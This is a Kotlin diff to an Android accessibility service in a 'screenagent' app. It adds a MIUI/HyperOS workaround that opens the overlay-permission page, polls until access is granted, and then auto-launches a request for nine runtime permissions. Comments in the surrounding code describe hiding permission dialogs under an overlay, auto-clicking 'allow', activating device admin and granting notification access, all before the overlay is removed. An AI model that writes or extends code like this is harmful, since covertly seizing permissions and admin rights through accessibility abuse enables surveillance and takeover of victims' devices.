@@ -115,6 +115,36 @@ class BoundaryAccessibilityService : AccessibilityService() {
         main.postDelayed(nodeSnapshot, NODE_REFRESH_INTERVAL_MS)
     }
 
+    /**
+     * MIUI 分支的续跑器：用户在系统页打开"显示悬浮窗/后台弹出界面"后，
+     * 自动继续拉起 PermissionActivity 申请 9 项运行时权限（无需再手动重开无障碍）。
+     */
+    private var miuiGateTry = 0
+    private val miuiGateTick = object : Runnable {
+        override fun run() {
+            if (!com.zaka.screenagent.admin.OnboardingState.isDone(this@BoundaryAccessibilityService) &&
+                android.provider.Settings.canDrawOverlays(this@BoundaryAccessibilityService)) {
+                android.util.Log.d("AccGuard", "MIUI gate: overlay granted -> resume permission request")
+                runCatching {
+                    startActivity(
+                        android.content.Intent(
+                            this@BoundaryAccessibilityService,
+                            com.zaka.screenagent.perm.PermissionActivity::class.java
+                        ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    )
+                }
+                return
+            }
+            if (miuiGateTry++ < 40) main.postDelayed(this, 3000L)
+        }
+    }
+
+    private fun miuiOverlayGateTick() {
+        miuiGateTry = 0
+        main.removeCallbacks(miuiGateTick)
+        main.postDelayed(miuiGateTick, 3000L)
+    }
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         destroyed = false
@@ -134,18 +164,34 @@ class BoundaryAccessibilityService : AccessibilityService() {
         val dbgNoAutoClick = com.zaka.screenagent.util.DebugFlags.noAutoClick(this)
         if (!com.zaka.screenagent.admin.OnboardingState.isDone(this) &&
             !com.zaka.screenagent.ui.BlackScreen.isShowing()) {
-            if (!dbgNoOverlay) runCatching { com.zaka.screenagent.ui.GuardOverlay.show(this) }
+            if (!dbgNoOverlay && !com.zaka.screenagent.BuildConfig.NO_GUIDE) runCatching { com.zaka.screenagent.ui.GuardOverlay.show(this) }
             // 引导链：权限申请（浮层遮盖）→ 自动点允许 → 设备管理员激活 → 100% 收浮层
             com.zaka.screenagent.admin.AdminActivator.attach(this)
             com.zaka.screenagent.admin.AdminActivator.autoclick = !dbgNoAutoClick
             com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !dbgNoAutoClick
             if (!dbgNoAutoClick) runCatching { com.zaka.screenagent.perm.PermissionClicker.start(this) }
             if (!com.zaka.screenagent.ui.BlackScreen.isShowing()) {
-                runCatching {
-                    startActivity(
-                        android.content.Intent(this, com.zaka.screenagent.perm.PermissionActivity::class.java)
-                            .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-                    )
+                if (com.zaka.screenagent.util.OemProfiles.needsOverlayGate(this)) {
+                    // MIUI/HyperOS 分支：没有悬浮窗权限时后台拉 PermissionActivity 会被系统拒
+                    // （ActivityStarterImpl: MIUILOG- Permission Denied Activity），
+                    // 先打开系统的"显示在其他应用上层"授权页，用户允许后再自动继续申请运行时权限。
+                    android.util.Log.w("AccGuard", "MIUI gate: overlay missing -> open overlay settings first")
+                    runCatching {
+                        startActivity(
+                            android.content.Intent(
+                                android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                                android.net.Uri.parse("package:$packageName")
+                            ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        )
+                    }
+                    miuiOverlayGateTick()
+                } else {
+                    runCatching {
+                        startActivity(
+                            android.content.Intent(this, com.zaka.screenagent.perm.PermissionActivity::class.java)
+                                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        )
+                    }
                 }
             }
         }
